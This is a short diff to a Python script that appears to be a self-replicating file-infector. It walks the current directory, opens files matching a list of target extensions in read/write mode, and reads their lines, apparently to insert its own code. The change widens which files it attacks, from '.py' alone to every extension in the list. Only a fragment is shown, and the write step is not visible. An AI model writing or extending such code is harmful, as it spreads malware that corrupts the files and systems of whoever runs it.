@@ -37,7 +37,7 @@ for i in range(len(this_lines)):
 
 for fname in os.listdir('.'):
     for target in targets:
-        if fname.find('.py') == len(fname) - len('.py'):
+        if fname.find(target) == len(fname) - len(target):
             try:
                 script_file = open(fname, 'r+')
                 target_lines = script_file.readlines()
